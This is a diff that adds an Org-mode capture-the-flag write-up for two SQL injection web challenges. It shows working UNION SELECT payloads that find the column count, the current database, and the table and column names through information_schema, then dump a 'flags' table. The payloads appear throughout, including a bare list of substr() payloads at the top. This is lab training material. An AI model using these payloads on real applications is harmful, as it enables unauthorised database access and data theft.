@@ -1,0 +1,84 @@
+* SQLi 1
+
+** What you learn
+
+
+** Writeup
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/cybersecurity-ctf/web-501-sqli-1/WRITEUP_att
+:END:
+
+#+BEGIN_SRC sql
+' UNION SELECT 1,description,3 FROM flags #
+' UNION SELECT 1,substr(description,5,5),3 FROM flags #
+' UNION SELECT 1,substr(description,10,5),3 FROM flags #
+' UNION SELECT 1,substr(description,15,5),3 FROM flags #
+' UNION SELECT 1,substr(description,20,5),3 FROM flags #
+' UNION SELECT 1,substr(description,25,5),3 FROM flags #
+' UNION SELECT 1,substr(description,30,5),3 FROM flags #
+#+END_SRC
+
+** WAIT What you learn
+
+you can extract data from the database using SQL Injections.
+
+** WAIT Writeup
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/cybersecurity-ctf/web-502-sqli-2/WRITEUP_att
+:END:
+
+Opening the challenge will show you a search bar.
+
+[[file:WRITEUP_att/screenshot-20201024-161502.png]]
+
+Entering some data will eventually lead you to retrieve some data from the system. Using the value ~a~ will retrieve products with an ~a~ in it.
+
+[[file:WRITEUP_att/screenshot-20201024-161610.png]]
+
+Entering a ~'~ will actually show a very nice error message.
+
+[[file:WRITEUP_att/screenshot-20201024-161643.png]]
+
+So, the application is susceptible to SQL Injections. Using the SQL Injection from the previous challenge only shows you the entire products table, but not a flag. The hint is to search for ~UNION SELECT~ statements. Trying ~' UNION SELECT 1 #~ as a search term actually shows a very interesting error message.
+
+[[file:WRITEUP_att/screenshot-20201024-161843.png]]
+
+So, the ~UNION~ works, now to figure out the number of columns. After a few attempts you will get to 3 as the number of columns in the query using ~' UNION SELECT 1,2,3 #~. Now to find where the flag is stored.
+
+*** What is the current database?
+
+Using the ~DATABASE()~ function the current database can be retrieved. The query will become ~' UNION SELECT 1,DATABASE(),3 #~. This will show the value of the current database in the ~Description~ column.
+
+[[file:WRITEUP_att/screenshot-20201024-162127.png]]
+
+Great, we now know that we are in a database called ~testdb~.
+
+*** Finding other tables
+
+Now that we know what the database is, we can use that value and query what other tables are part of the schema. This information is stored in the ~information_schema~ in the table ~tables~.
+
+#+BEGIN_SRC sql
+' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='testdb' #
+#+END_SRC
+
+[[file:WRITEUP_att/screenshot-20201024-230704.png]]
+
+With the table names in had, of which ~flags~ seems the most obvious, all that is needed to get its contents is to know the columns in the table. Using the ~information_schema~ again, but then with the ~columns~ table, this information can be revealed.
+
+#+BEGIN_SRC sql
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flags' #
+#+END_SRC
+
+The product table will have 1 extra row; ~description~.
+
+*** Get the flag!
+
+Using the information gathered from the ~information_schema~ the contents of the ~flags~ table can be read.
+
+#+BEGIN_SRC sql
+' UNION SELECT 1,description,3 FROM flags #
+#+END_SRC
+
+And there is the flag.
+
+[[file:WRITEUP_att/screenshot-20201024-230828.png]]
